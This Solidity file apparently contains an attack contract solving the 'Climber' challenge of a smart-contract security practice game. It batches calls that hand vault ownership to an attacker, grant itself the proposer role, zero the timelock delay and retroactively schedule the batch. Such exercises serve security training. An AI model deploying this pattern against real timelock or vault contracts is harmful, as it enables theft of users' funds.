// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ThirdParty {
    function scheduleOperation(address attacker, ClimberTimelock timelock, ClimberVault vault) external {
        address thirdParty = address(this);

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, address(attacker));

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, thirdParty);

        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        targets[3] = address(thirdParty);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(ThirdParty.scheduleOperation.selector, attacker, timelock, vault);

        timelock.schedule(targets, values, dataElements, 0);
    }
}
